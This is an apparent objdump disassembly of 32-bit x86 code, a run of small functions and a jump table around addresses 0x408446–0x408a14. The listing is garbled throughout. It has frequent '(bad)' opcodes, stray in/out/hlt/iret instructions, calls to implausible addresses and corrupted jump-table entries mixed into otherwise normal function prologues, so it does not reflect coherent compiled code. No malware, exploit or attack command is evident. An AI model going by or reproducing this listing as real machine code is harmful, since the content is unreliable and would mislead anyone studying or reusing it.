  408446:	c6                   	(bad)
  408447:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408448:	30 46 85             	xor    %al,-0x7b(%esi)
  40844b:	ff                   	(bad)
  40844c:	7e 4d                	jle    0x40849b
  40844e:	c6 06 2e             	movb   $0x2e,(%esi)
  408451:	46                   	inc    %esi
  408452:	85 c0                	test   %eax,%eax
  408454:	7d 28                	jge    0x40847e
  408456:	f7 93 8b c8 09 45    	notl   0x4509c88b(%ebx)
  40845c:	1c 8b                	sbb    $0x8b,%al
  40845e:	7c b8                	jl     0x408418
  408460:	30 30                	xor    %dh,(%eax)
  408462:	30 30                	xor    %dh,(%eax)
  408464:	8b fe                	mov    %esi,%edi
  408466:	c1 e9 02             	shr    $0x2,%ecx
  408469:	f3 ab                	rep stos %eax,%es:(%edi)
  40846b:	8b aa 83 e1 d3 f3    	mov    -0xc2c1e7d(%edx),%ebp
  408471:	aa                   	stos   %al,%es:(%edi)
  408472:	8b 45 18             	mov    0x18(%ebp),%eax
  408475:	8b ca                	mov    %edx,%ecx
  408477:	8a 55 a1             	mov    -0x5f(%ebp),%dl
  40847a:	03 f1                	add    %ecx,%esi
  40847c:	03 c1                	add    %ecx,%eax
  40847e:	37                   	aaa
  40847f:	cb                   	lret
  408480:	45                   	inc    %ebp
  408481:	18 eb                	sbb    %ch,%bl
  408483:	3f                   	aas
  408484:	48                   	dec    %eax
  408485:	46                   	inc    %esi
  408486:	93                   	xchg   %eax,%ebx
  408487:	45                   	inc    %ebp
  408488:	18 8a 0b 4e 4e ff    	sbb    %cl,-0xb1b1f5(%edx)
  40848e:	43                   	inc    %ebx
  40848f:	85 47 7f             	test   %eax,0x7f(%edi)
  408492:	f1                   	int1
  408493:	b9 85 ff 89 45       	mov    $0x4589ff85,%ecx
  408498:	18 7f 07             	sbb    %bh,0x7(%edi)
  40849b:	d9 4d b5             	(bad) -0x4b(%ebp)
  40849e:	85 c9                	test   %ecx,%ecx
  4084a0:	63 23                	arpl   %esp,(%ebx)
  4084a2:	c6 06 6d             	movb   $0x6d,(%esi)
  4084a5:	46                   	inc    %esi
  4084a6:	eb 1b                	jmp    0x4084c3
  4084a8:	8b 59 20             	mov    0x20(%ecx),%ebx
  4084ab:	cd 03                	int    $0x3
  4084ad:	88 29                	mov    %ch,(%ecx)
  4084af:	46                   	inc    %esi
  4084b0:	43                   	inc    %ebx
  4084b1:	85 ff                	test   %edi,%edi
  4084b3:	7f 83                	jg     0x408438
  4084b5:	8b 45 73             	mov    0x73(%ebp),%eax
  4084b8:	85 c0                	test   %eax,%eax
  4084ba:	91                   	xchg   %eax,%ecx
  4084bb:	9e                   	sahf
  4084bc:	c6 06 28             	movb   $0x28,(%esi)
  4084bf:	46                   	inc    %esi
  4084c0:	03 99 18 8a 0b 61    	add    0x610b8a18(%ecx),%ebx
  4084c6:	c9                   	leave
  4084c7:	df 0b                	fisttps (%ebx)
  4084c9:	88 0e                	mov    %cl,(%esi)
  4084cb:	8a 4b 01             	mov    0x1(%ebx),%cl
  4084ce:	46                   	inc    %esi
  4084cf:	43                   	inc    %ebx
  4084d0:	84 c9                	test   %cl,%cl
  4084d2:	36 f5                	ss cmc
  4084d4:	80 f2 66             	xor    $0x66,%dl
  4084d7:	74 68                	je     0x408541
  4084d9:	88 16                	mov    %dl,(%esi)
  4084db:	46                   	inc    %esi
  4084dc:	48                   	dec    %eax
  4084dd:	89 86 b9 31 53 8d    	mov    %eax,-0x72acce47(%esi)
  4084e3:	4d                   	dec    %ebp
  4084e4:	1c 8d                	sbb    $0x8d,%al
  4084e6:	55                   	push   %ebp
  4084e7:	fe                   	(bad)
  4084e8:	51                   	push   %ecx
  4084e9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4084ec:	52                   	push   %edx
  4084ed:	f8                   	clc
  4084ee:	6a 00                	push   $0x0
  4084f0:	50                   	push   %eax
  4084f1:	e8 fa 20 ff ff       	call   0x3fa5f0
  4084f6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4084f9:	83 c4 14             	add    $0x14,%esp
  4084fc:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4084ff:	85 db                	test   %ebx,%ebx
  408501:	0f 95 c2             	setne  %dl
  408504:	46                   	inc    %esi
  408505:	83 7e 9a 8d          	cmpl   $0xffffff8d,-0x66(%esi)
  408509:	54                   	push   %esp
  40850a:	12 2b                	adc    (%ebx),%ch
  40850c:	88 56 ff             	mov    %dl,-0x1(%esi)
  40850f:	75 90                	jne    0x4084a1
  408511:	f9                   	stc
  408512:	06                   	push   %es
  408513:	15 46 eb 04 58       	adc    $0x5804eb46,%eax
  408518:	c9                   	leave
  408519:	74 26                	je     0x408541
  40851b:	fe                   	(bad)
  40851c:	10 b6 07 46 40 49    	adc    %dh,0x49404607(%esi)
  408522:	75 f7                	jne    0x40851b
  408524:	8b 45 20             	mov    0x20(%ebp),%eax
  408527:	23 4d 24             	and    0x24(%ebp),%ecx
  40852a:	2b f0                	sub    %eax,%esi
  40852c:	5f                   	pop    %edi
  40852d:	0b 31                	or     (%ecx),%esi
  40852f:	5e                   	pop    %esi
  408530:	5b                   	pop    %ebx
  408531:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408532:	e5 7a                	in     $0x7a,%eax
  408534:	86 c6                	xchg   %al,%dh
  408536:	06                   	push   %es
  408537:	2b 46 c6             	sub    -0x3a(%esi),%eax
  40853a:	06                   	push   %es
  40853b:	33 46 c6             	xor    -0x3a(%esi),%eax
  40853e:	9f                   	lahf
  40853f:	30 46 f5             	xor    %al,-0xb(%esi)
  408542:	45                   	inc    %ebp
  408543:	20 8b 4d 24 2b f0    	and    %cl,-0xfd4dbb3(%ebx)
  408549:	5f                   	pop    %edi
  40854a:	1b 31                	sbb    (%ecx),%esi
  40854c:	5e                   	pop    %esi
  40854d:	5b                   	pop    %ebx
  40854e:	8b 79 56             	mov    0x56(%ecx),%edi
  408551:	c3                   	ret
  408552:	90                   	nop
  408553:	90                   	nop
  408554:	90                   	nop
  408555:	90                   	nop
  408556:	90                   	nop
  408557:	90                   	nop
  408558:	90                   	nop
  408559:	90                   	nop
  40855a:	3d 90 32 90 0b       	cmp    $0xb903290,%eax
  40855f:	90                   	nop
  408560:	55                   	push   %ebp
  408561:	8b ec                	mov    %esp,%ebp
  408563:	fb                   	sti
  408564:	45                   	inc    %ebp
  408565:	1c 8b                	sbb    $0x8b,%al
  408567:	4d                   	dec    %ebp
  408568:	18 54 14 14          	sbb    %dl,0x14(%esp,%edx,1)
  40856c:	50                   	push   %eax
  40856d:	8b 45 10             	mov    0x10(%ebp),%eax
  408570:	e6 00                	out    %al,$0x0
  408572:	36 8b 4d 8b          	mov    %ss:-0x75(%ebp),%ecx
  408576:	a8 8b                	test   $0x8b,%al
  408578:	55                   	push   %ebp
  408579:	b4 50                	mov    $0x50,%ah
  40857b:	f8                   	clc
  40857c:	52                   	push   %edx
  40857d:	e8 6e f9 ff ff       	call   0x407ef0
  408582:	83 bf 1c 5d f2 90 9a 	cmpl   $0xffffff9a,-0x6f0da2e4(%edi)
  408589:	90                   	nop
  40858a:	90                   	nop
  40858b:	90                   	nop
  40858c:	67 90                	addr16 nop
  40858e:	90                   	nop
  40858f:	90                   	nop
  408590:	55                   	push   %ebp
  408591:	8b ec                	mov    %esp,%ebp
  408593:	53                   	push   %ebx
  408594:	56                   	push   %esi
  408595:	57                   	push   %edi
  408596:	8b 7d ba             	mov    -0x46(%ebp),%edi
  408599:	be 01 00 00 00       	mov    $0x1,%esi
  40859e:	8b cf                	mov    %edi,%ecx
  4085a0:	94                   	xchg   %eax,%esp
  4085a1:	45                   	inc    %ebp
  4085a2:	14 bb                	adc    $0xbb,%al
  4085a4:	bc c2 4f 00 8c       	mov    $0x8c004fc2,%esp
  4085a9:	b9 8a 4d 10 4e       	mov    $0x4e104d8a,%ecx
  4085ae:	80 f9 58             	cmp    $0x58,%cl
  4085b1:	74 05                	je     0x4085b8
  4085b3:	bb a8 c2 40 00       	mov    $0x40c2a8,%ebx
  4085b8:	8b 55 08             	mov    0x8(%ebp),%edx
  4085bb:	8b ce                	mov    %esi,%ecx
  4085bd:	ff 23                	jmp    *(%ebx)
  4085bf:	ca 8a 0c             	lret   $0xc8a
  4085c2:	19 09                	sbb    %ecx,(%ecx)
  4085c4:	08 8b cf d3 ea 85    	or     %cl,-0x7a152c31(%ebx)
  4085ca:	d2 75 ee             	shlb   %cl,-0x12(%ebp)
  4085cd:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4085d0:	8b ae 8c 2b c8 5f    	mov    0x5fc82b8c(%esi),%ebp
  4085d6:	5e                   	pop    %esi
  4085d7:	89 0a                	mov    %ecx,(%edx)
  4085d9:	5b                   	pop    %ebx
  4085da:	80 c3 3a             	add    $0x3a,%bl
  4085dd:	90                   	nop
  4085de:	90                   	nop
  4085df:	90                   	nop
  4085e0:	55                   	push   %ebp
  4085e1:	8b ec                	mov    %esp,%ebp
  4085e3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4085e6:	39 29                	cmp    %ebp,(%ecx)
  4085e8:	8a 45 14             	mov    0x14(%ebp),%al
  4085eb:	57                   	push   %edi
  4085ec:	bf 01 17 00 00       	mov    $0x1701,%edi
  4085f1:	37                   	aaa
  4085f2:	75 18                	jne    0x40860c
  4085f4:	bb e4 c2 40 00       	mov    $0x40c2e4,%ebx
  4085f9:	e7 e7                	out    %eax,$0xe7
  4085fb:	4f                   	dec    %edi
  4085fc:	3c 58                	cmp    $0x58,%al
  4085fe:	ca 05 d2             	lret   $0xd205
  408601:	d0 90 40 00 43 55    	rclb   $1,0x55430040(%eax)
  408607:	0c 8b                	or     $0x8b,%al
  408609:	52                   	push   %edx
  40860a:	08 85 d2 bd ea 72    	or     %al,0x72eabdd2(%ebp)
  408610:	05 83 f8 ff 77       	add    $0x77fff883,%eax
  408615:	1b 8b de 72 9f 8b    	sbb    -0x74608d22(%ebx),%ecx
  40861b:	55                   	push   %ebp
  40861c:	8c 52 5f             	mov    %ss,0x5f(%edx)
  40861f:	55                   	push   %ebp
  408620:	14 fe                	adc    $0xfe,%al
  408622:	51                   	push   %ecx
  408623:	50                   	push   %eax
  408624:	5f                   	pop    %edi
  408625:	51                   	push   %ecx
  408626:	40                   	inc    %eax
  408627:	4f                   	dec    %edi
  408628:	21 83 c4 14 5f 5e    	and    %eax,0x5e5f14c4(%ebx)
  40862e:	5b                   	pop    %ebx
  40862f:	5d                   	pop    %ebp
  408630:	c3                   	ret
  408631:	fe c8                	dec    %al
  408633:	4e                   	dec    %esi
  408634:	23 dd                	and    %ebp,%ebx
  408636:	8a 0c 8f             	mov    (%edi,%ecx,4),%cl
  408639:	88 0e                	mov    %cl,(%esi)
  40863b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40863e:	89 bd 19 00 00 8b    	mov    %edi,-0x74ffffe7(%ebp)
  408644:	c8 63 ca 9e          	enter  $0xca63,$0x9e
  408648:	8f                   	(bad)
  408649:	26 45                	es inc %ebp
  40864b:	18 8b 55 1c 2b c6    	sbb    %cl,-0x39d4e3ab(%ebx)
  408651:	5f                   	pop    %edi
  408652:	89 02                	mov    %eax,(%edx)
  408654:	8b c6                	mov    %esi,%eax
  408656:	5e                   	pop    %esi
  408657:	8a 5d c3             	mov    -0x3d(%ebp),%bl
  40865a:	90                   	nop
  40865b:	90                   	nop
  40865c:	d5 90                	aad    $0x90
  40865e:	90                   	nop
  40865f:	90                   	nop
  408660:	55                   	push   %ebp
  408661:	8b ec                	mov    %esp,%ebp
  408663:	8b 4d eb             	mov    -0x15(%ebp),%ecx
  408666:	8b 6c 08 8b          	mov    -0x75(%eax,%ecx,1),%ebp
  40866a:	55                   	push   %ebp
  40866b:	0c 51                	or     $0x51,%al
  40866d:	8b 00                	mov    (%eax),%eax
  40866f:	52                   	push   %edx
  408670:	6a 9a                	push   $0xffffff9a
  408672:	6a 04                	push   $0x4
  408674:	50                   	push   %eax
  408675:	e8 16 ff ff ff       	call   0x408590
  40867a:	3a 0c 14             	cmp    (%esp,%edx,1),%cl
  40867d:	5d                   	pop    %ebp
  40867e:	c3                   	ret
  40867f:	90                   	nop
  408680:	55                   	push   %ebp
  408681:	8b ec                	mov    %esp,%ebp
  408683:	83 ec 08             	sub    $0x8,%esp
  408686:	56                   	push   %esi
  408687:	8b 75 0c             	mov    0xc(%ebp),%esi
  40868a:	85 f6                	test   %esi,%esi
  40868c:	75 08                	jne    0x408696
  40868e:	89 75 f8             	mov    %esi,-0x8(%ebp)
  408691:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408694:	eb 0d                	jmp    0x4086a3
  408696:	28 45 08             	sub    %al,0x8(%ebp)
  408699:	89 a6 f8 8d e9 30    	mov    %esp,0x30e98df8(%esi)
  40869f:	8e 89 45 fc 8b 55    	mov    0x558bfc45(%ecx),%cs
  4086a5:	10 8d fb 14 f8 28    	adc    %cl,0x28f814fb(%ebp)
  4086ab:	45                   	inc    %ebp
  4086ac:	89 52 50             	mov    %edx,0x50(%edx)
  4086af:	68 d0 86 24 00       	push   $0x2486d0
  4086b4:	b0 f6                	mov    $0xf6,%al
  4086b6:	ea ff ff 85 f6 74 06 	ljmp   $0x674,$0xf685ffff
  4086bd:	8b 4d a6             	mov    -0x5a(%ebp),%ecx
  4086c0:	c6 01 ef             	movb   $0xef,(%ecx)
  4086c3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4086c6:	75 ed                	jne    0x4086b5
  4086c8:	8d 46 ff             	lea    -0x1(%esi),%eax
  4086cb:	5e                   	pop    %esi
  4086cc:	8b e5                	mov    %ebp,%esp
  4086ce:	14 c3                	adc    $0xc3,%al
  4086d0:	83 c8 ff             	or     $0xffffffff,%eax
  4086d3:	c3                   	ret
  4086d4:	90                   	nop
  4086d5:	90                   	nop
  4086d6:	90                   	nop
  4086d7:	90                   	nop
  4086d8:	90                   	nop
  4086d9:	90                   	nop
  4086da:	90                   	nop
  4086db:	90                   	nop
  4086dc:	7d 90                	jge    0x40866e
  4086de:	90                   	nop
  4086df:	90                   	nop
  4086e0:	55                   	push   %ebp
  4086e1:	8b ec                	mov    %esp,%ebp
  4086e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4086e6:	3d 20 4e 00 00       	cmp    $0x4e20,%eax
  4086eb:	7d 15                	jge    0x408702
  4086ed:	2e 4d                	cs dec %ebp
  4086ef:	10 8b 55 0c 8a 24    	adc    %cl,0x248a0c55(%ebx)
  4086f5:	50                   	push   %eax
  4086f6:	e8 85 03 00 00       	call   0x408a80
  4086fb:	83 c4 0c             	add    $0xc,%esp
  4086fe:	5d                   	pop    %ebp
  4086ff:	c2 0c 34             	ret    $0x340c
  408702:	3f                   	aas
  408703:	c0 d4 01             	rcl    $0x1,%ah
  408706:	75 7d                	jne    0x408785
  408708:	1b 86 37 91 00 00    	sbb    0x9137(%esi),%eax
  40870e:	d5 8b                	aad    $0x8b
  408710:	4d                   	dec    %ebp
  408711:	0c 50                	or     $0x50,%al
  408713:	8b 45 10             	mov    0x10(%ebp),%eax
  408716:	23 51 e8             	and    -0x18(%ecx),%edx
  408719:	63 00                	arpl   %eax,(%eax)
  40871b:	83 00 83             	addl   $0xffffff83,(%eax)
  40871e:	c4 10                	les    (%eax),%edx
  408720:	5d                   	pop    %ebp
  408721:	c2 0c 00             	ret    $0xc
  408724:	cf                   	iret
  408725:	30 39                	xor    %bh,(%ecx)
  408727:	60                   	pusha
  408728:	cc                   	int3
  408729:	7d 19                	jge    0x408744
  40872b:	8b 55 10             	mov    0x10(%ebp),%edx
  40872e:	ab                   	stos   %eax,%es:(%edi)
  40872f:	45                   	inc    %ebp
  408730:	e4 68                	in     $0x68,%al
  408732:	54                   	push   %esp
  408733:	f9                   	stc
  408734:	40                   	inc    %eax
  408735:	00 52 04             	add    %dl,0x4(%edx)
  408738:	e8 43 8e 76 00       	call   0xb71580
  40873d:	83 c4 0c             	add    $0xc,%esp
  408740:	5d                   	pop    %ebp
  408741:	c2 0c 00             	ret    $0xc
  408744:	3d 80 fc 40 00       	cmp    $0x40fc80,%eax
  408749:	7d 19                	jge    0x408764
  40874b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40874e:	8b 55 0c             	mov    0xc(%ebp),%edx
  408751:	68 19 f9 40 c0       	push   $0xc040f919
  408756:	51                   	push   %ecx
  408757:	df e8                	fucomip %st(0),%st
  408759:	cc                   	int3
  40875a:	00 41 00             	add    %al,0x0(%ecx)
  40875d:	83 c4 0c             	add    $0xc,%esp
  408760:	5d                   	pop    %ebp
  408761:	c2 0d 00             	ret    $0xd
  408764:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408767:	05 10 86 f5 ff       	add    $0xfff58610,%eax
  40876c:	cf                   	iret
  40876d:	8b 21                	mov    (%ecx),%esp
  40876f:	10 50 51             	adc    %dl,0x51(%eax)
  408772:	45                   	inc    %ebp
  408773:	59                   	pop    %ecx
  408774:	02 00                	add    (%eax),%al
  408776:	00 83 c4 0c 5d c2    	add    %al,-0x3da2f33c(%ebx)
  40877c:	0c 00                	or     $0x0,%al
  40877e:	90                   	nop
  40877f:	90                   	nop
  408780:	55                   	push   %ebp
  408781:	8b ec                	mov    %esp,%ebp
  408783:	8b 45 b5             	mov    -0x4b(%ebp),%eax
  408786:	06                   	push   %es
  408787:	4d                   	dec    %ebp
  408788:	10 56 8b             	adc    %dl,-0x75(%esi)
  40878b:	75 08                	jne    0x408795
  40878d:	50                   	push   %eax
  40878e:	51                   	push   %ecx
  40878f:	56                   	push   %esi
  408790:	e8 bb 1d 00 59       	call   0x5940a550
  408795:	8b c6                	mov    %esi,%eax
  408797:	5e                   	pop    %esi
  408798:	5d                   	pop    %ebp
  408799:	c3                   	ret
  40879a:	90                   	nop
  40879b:	90                   	nop
  40879c:	90                   	nop
  40879d:	90                   	nop
  40879e:	8e 90 48 8b 24 8b    	mov    -0x74db74b8(%eax),%ss
  4087a4:	45                   	inc    %ebp
  4087a5:	08 3d 71 11 5a 00    	or     %bh,0x5a1171
  4087ab:	0f 8f 7a 00 00 09    	jg     0x940882b
  4087b1:	0f 84 b6 f3 00 00    	je     0x417b6d
  4087b7:	05 de b1 ff ff       	add    $0xffffb1de,%eax
  4087bc:	7f f8                	jg     0x4087b6
  4087be:	19 0f                	sbb    %ecx,(%edi)
  4087c0:	41                   	inc    %ecx
  4087c1:	37                   	aaa
  4087c2:	d1 00                	roll   $1,(%eax)
  4087c4:	00 a2 b3 b7 04 89    	add    %ah,-0x76fb484d(%edx)
  4087ca:	40                   	inc    %eax
  4087cb:	00 b8 84 00 41 00    	add    %bh,0x410084(%eax)
  4087d1:	5d                   	pop    %ebp
  4087d2:	c3                   	ret
  4087d3:	b8 60 00 41 00       	mov    $0x410060,%eax
  4087d8:	5d                   	pop    %ebp
  4087d9:	c3                   	ret
  4087da:	b8 40 db 57 ec       	mov    $0xec57db40,%eax
  4087df:	87 c3                	xchg   %eax,%ebx
  4087e1:	7f 10                	jg     0x4087f3
  4087e3:	00 41 c3             	add    %al,-0x3d(%ecx)
  4087e6:	5d                   	pop    %ebp
  4087e7:	c3                   	ret
  4087e8:	b8 e4 ff 40 05       	mov    $0x540ffe4,%eax
  4087ed:	5d                   	pop    %ebp
  4087ee:	c3                   	ret
  4087ef:	b8 24 ff 40 4f       	mov    $0x4f40ff24,%eax
  4087f4:	df 10                	fists  (%eax)
  4087f6:	b8 be ff 40 00       	mov    $0x40ffbe,%eax
  4087fb:	5d                   	pop    %ebp
  4087fc:	c3                   	ret
  4087fd:	3e 50                	ds push %eax
  4087ff:	ff 40 00             	incl   0x0(%eax)
  408802:	5d                   	pop    %ebp
  408803:	c3                   	ret
  408804:	b8 a6 7c 40 00       	mov    $0x407ca6,%eax
  408809:	8c c3                	mov    %es,%ebx
  40880b:	56                   	push   %esi
  40880c:	f0 44                	lock inc %esp
  40880e:	40                   	inc    %eax
  40880f:	00 5d c3             	add    %bl,-0x3d(%ebp)
  408812:	b8 b4 fe 40 00       	mov    $0x40feb4,%eax
  408817:	5d                   	pop    %ebp
  408818:	c3                   	ret
  408819:	b8 05 fe 40 00       	mov    $0x40fe05,%eax
  40881e:	5d                   	pop    %ebp
  40881f:	c3                   	ret
  408820:	b8 7c ba 40 00       	mov    $0x40ba7c,%eax
  408825:	5d                   	pop    %ebp
  408826:	c3                   	ret
  408827:	37                   	aaa
  408828:	54                   	push   %esp
  408829:	fe 40 00             	incb   0x0(%eax)
  40882c:	5d                   	pop    %ebp
  40882d:	7f b8                	jg     0x4087e7
  40882f:	2c fe                	sub    $0xfe,%al
  408831:	40                   	inc    %eax
  408832:	00 5d c3             	add    %bl,-0x3d(%ebp)
  408835:	b8 46 fe 40 00       	mov    $0x40fe46,%eax
  40883a:	5d                   	pop    %ebp
  40883b:	c3                   	ret
  40883c:	6e                   	outsb  %ds:(%esi),(%dx)
  40883d:	f4                   	hlt
  40883e:	fd                   	std
  40883f:	90                   	nop
  408840:	61                   	popa
  408841:	f6 c3 b8             	test   $0xb8,%bl
  408844:	d4 fd                	aam    $0xfd
  408846:	40                   	inc    %eax
  408847:	00 63 c3             	add    %ah,-0x3d(%ebx)
  40884a:	b8 ac fd 40 00       	mov    $0x40fdac,%eax
  40884f:	1c c3                	sbb    $0xc3,%al
  408851:	49                   	dec    %ecx
  408852:	13 fd                	adc    %ebp,%edi
  408854:	82 6f 5d c3          	subb   $0xc3,0x5d(%edi)
  408858:	b8 3c fd 40 00       	mov    $0x40fd3c,%eax
  40885d:	5d                   	pop    %ebp
  40885e:	bc b8 1c fd 40       	mov    $0x40fd1cb8,%esp
  408863:	00 1b                	add    %bl,(%ebx)
  408865:	c3                   	ret
  408866:	b8 0c fd 40 37       	mov    $0x3740fd0c,%eax
  40886b:	5d                   	pop    %ebp
  40886c:	c3                   	ret
  40886d:	c4                   	(bad)
  40886e:	fa                   	cli
  40886f:	fc                   	cld
  408870:	40                   	inc    %eax
  408871:	d8 5d 67             	fcomps 0x67(%ebp)
  408874:	05 8e ee fe ff       	add    $0xfffeee8e,%eax
  408879:	d9 5b 16             	fstps  0x16(%ebx)
  40887c:	77 7e                	ja     0x4088fc
  40887e:	ff 24 85 6c 89 40 00 	jmp    *0x40896c(,%eax,4)
  408885:	38 70 fc             	cmp    %dh,-0x4(%eax)
  408888:	40                   	inc    %eax
  408889:	00 5d c3             	add    %bl,-0x3d(%ebp)
  40888c:	b8 48 fc 40 00       	mov    $0x40fc48,%eax
  408891:	5d                   	pop    %ebp
  408892:	c1 b8 20 fc 9a 00 5d 	sarl   $0x5d,0x9afc20(%eax)
  408899:	c3                   	ret
  40889a:	b8 f0 fb 40 24       	mov    $0x2440fbf0,%eax
  40889f:	5d                   	pop    %ebp
  4088a0:	c3                   	ret
  4088a1:	b8 bc fb 5b 00       	mov    $0x5bfbbc,%eax
  4088a6:	5d                   	pop    %ebp
  4088a7:	c3                   	ret
  4088a8:	b8 98 60 40 00       	mov    $0x406098,%eax
  4088ad:	5d                   	pop    %ebp
  4088ae:	c3                   	ret
  4088af:	b8 60 fb 40 00       	mov    $0x40fb60,%eax
  4088b4:	5d                   	pop    %ebp
  4088b5:	c3                   	ret
  4088b6:	b8 38 66 40 ae       	mov    $0xae406638,%eax
  4088bb:	82 c3 b8             	add    $0xb8,%bl
  4088be:	00 d6                	add    %dl,%dh
  4088c0:	32 00                	xor    (%eax),%al
  4088c2:	5d                   	pop    %ebp
  4088c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c4:	b8 ec fa 40 95       	mov    $0x9540faec,%eax
  4088c9:	5d                   	pop    %ebp
  4088ca:	c3                   	ret
  4088cb:	b8 84 fa 40 00       	mov    $0x40fa84,%eax
  4088d0:	5d                   	pop    %ebp
  4088d1:	c3                   	ret
  4088d2:	b8 90 fa 40 00       	mov    $0x40fa90,%eax
  4088d7:	5d                   	pop    %ebp
  4088d8:	c3                   	ret
  4088d9:	72 64                	jb     0x40893f
  4088db:	55                   	push   %ebp
  4088dc:	40                   	inc    %eax
  4088dd:	00 5d c3             	add    %bl,-0x3d(%ebp)
  4088e0:	fd                   	std
  4088e1:	34 fa                	xor    $0xfa,%al
  4088e3:	40                   	inc    %eax
  4088e4:	00 5d 89             	add    %bl,-0x77(%ebp)
  4088e7:	b8 f0 f9 93 00       	mov    $0x93f9f0,%eax
  4088ec:	5d                   	pop    %ebp
  4088ed:	c3                   	ret
  4088ee:	b8 b4 f9 40 c4       	mov    $0xc440f9b4,%eax
  4088f3:	5d                   	pop    %ebp
  4088f4:	45                   	inc    %ebp
  4088f5:	b8 9c 74 40 00       	mov    $0x40749c,%eax
  4088fa:	5d                   	pop    %ebp
  4088fb:	c3                   	ret
  4088fc:	b8 7c f9 5e 00       	mov    $0x5ef97c,%eax
  408901:	5d                   	pop    %ebp
  408902:	c3                   	ret
  408903:	90                   	nop
  408904:	bf 87 a0 00 38       	mov    $0x3800a087,%edi
  408909:	88 40 00             	mov    %al,0x0(%eax)
  40890c:	d3 87 40 00 da 87    	roll   %cl,-0x7825ffc0(%edi)
  408912:	83 00 e1             	addl   $0xffffffe1,(%eax)
  408915:	87 40 00             	xchg   %eax,0x0(%eax)
  408918:	e8 87 40 00 40       	call   0x4040c9a4
  40891d:	87 40 00             	xchg   %eax,0x0(%eax)
  408920:	f6 87 40 00 fd 87 40 	testb  $0x40,-0x7802ffc0(%edi)
  408927:	00 04 88             	add    %al,(%eax,%ecx,4)
  40892a:	40                   	inc    %eax
  40892b:	00 0b                	add    %cl,(%ebx)
  40892d:	88 40 00             	mov    %al,0x0(%eax)
  408930:	12 88 40 00 86 f5    	adc    -0xa79ffc0(%eax),%cl
  408936:	40                   	inc    %eax
  408937:	05 19 88 40 00       	add    $0x408819,%eax
  40893c:	e9 88 40 00 db       	jmp    0xdb40c9c9
  408941:	88 40 00             	mov    %al,0x0(%eax)
  408944:	fc                   	cld
  408945:	88 40 6c             	mov    %al,0x6c(%eax)
  408948:	20 49 40             	and    %cl,0x40(%ecx)
  40894b:	00 35 88 40 99 3c    	add    %dh,0x3c994088
  408951:	b2 40                	mov    $0x40,%dl
  408953:	00 43 88             	add    %al,-0x78(%ebx)
  408956:	09 00                	or     %eax,(%eax)
  408958:	4a                   	dec    %edx
  408959:	88 40 00             	mov    %al,0x0(%eax)
  40895c:	41                   	inc    %ecx
  40895d:	8a 40 46             	mov    0x46(%eax),%al
  408960:	58                   	pop    %eax
  408961:	88 40 00             	mov    %al,0x0(%eax)
  408964:	fc                   	cld
  408965:	88 40 00             	mov    %al,0x0(%eax)
  408968:	5f                   	pop    %edi
  408969:	c7 40 ba 85 04 40 00 	movl   $0x400485,-0x46(%eax)
  408970:	8c a0 75 00 93 88    	mov    %fs,-0x776cff8b(%eax)
  408976:	40                   	inc    %eax
  408977:	35 9a 0e 40 a9       	xor    $0xa9400e9a,%eax
  40897c:	a1 88 40 00 a8       	mov    0xa8004088,%eax
  408981:	2c 40                	sub    $0x40,%al
  408983:	8e af bd 40 00 fc    	mov    -0x3ffbf43(%edi),%gs
  408989:	88 40 00             	mov    %al,0x0(%eax)
  40898c:	fc                   	cld
  40898d:	1a 40 00             	sbb    0x0(%eax),%al
  408990:	b7 88                	mov    $0x88,%bh
  408992:	40                   	inc    %eax
  408993:	00 b6 88 40 00 bd    	add    %dh,-0x42ffbf78(%esi)
  408999:	02 4c 00 c4          	add    -0x3c(%eax,%eax,1),%cl
  40899d:	b8 da 00 cb 88       	mov    $0x88cb00da,%eax
  4089a2:	44                   	inc    %esp
  4089a3:	00 fc                	add    %bh,%ah
  4089a5:	88 40 00             	mov    %al,0x0(%eax)
  4089a8:	fc                   	cld
  4089a9:	88 7d 4d             	mov    %bh,0x4d(%ebp)
  4089ac:	9d                   	popf
  4089ad:	88 40 0a             	mov    %al,0xa(%eax)
  4089b0:	d2 88 40 00 d9 88    	rorb   %cl,-0x7726ffc0(%eax)
  4089b6:	40                   	inc    %eax
  4089b7:	00 e0                	add    %ah,%al
  4089b9:	b8 40 00 e7 88       	mov    $0x88e70040,%eax
  4089be:	40                   	inc    %eax
  4089bf:	00 94 e7 6c 00 f5 88 	add    %dl,-0x770aff94(%edi,%eiz,8)
  4089c6:	40                   	inc    %eax
  4089c7:	00 90 90 90 90 6b    	add    %dl,0x6b909090(%eax)
  4089cd:	11 86 90 55 8b fb    	adc    %eax,-0x474aa70(%esi)
  4089d3:	53                   	push   %ebx
  4089d4:	8b 8c 0c b1 19 75 08 	mov    0x87519b1(%esp,%ecx,1),%ecx
  4089db:	57                   	push   %edi
  4089dc:	8b 7d 10             	mov    0x10(%ebp),%edi
  4089df:	6a b2                	push   $0xffffffb2
  4089e1:	53                   	push   %ebx
  4089e2:	ee                   	out    %al,(%dx)
  4089e3:	68 91 04 00 00       	push   $0x491
  4089e8:	57                   	push   %edi
  4089e9:	6a 08                	push   $0x8
  4089eb:	62 00                	bound  %eax,(%eax)
  4089ed:	12 00                	adc    (%eax),%al
  4089ef:	00 ff                	add    %bh,%bh
  4089f1:	ec                   	in     (%dx),%al
  4089f2:	94                   	xchg   %eax,%esp
  4089f3:	b8 40 00 85 64       	mov    $0x64850040,%eax
  4089f8:	75 44                	jne    0x408a3e
  4089fa:	8b 0c 1c             	mov    (%esp,%ebx,1),%ecx
  4089fd:	c3                   	ret
  4089fe:	e4 00                	in     $0x0,%al
  408a00:	85 c9                	test   %ecx,%ecx
  408a02:	74 5b                	je     0x408a5f
  408a04:	39 ab c5 18 c3 1a    	cmp    %ebp,0x1ac318c5(%ebx)
  408a0a:	00 20                	add    %ah,(%eax)
  408a0c:	0e                   	push   %cs
  408a0d:	8b 0c c5 24 c3 40 00 	mov    0x40c324(,%eax,8),%ecx
  408a14:	40                   	inc    %eax
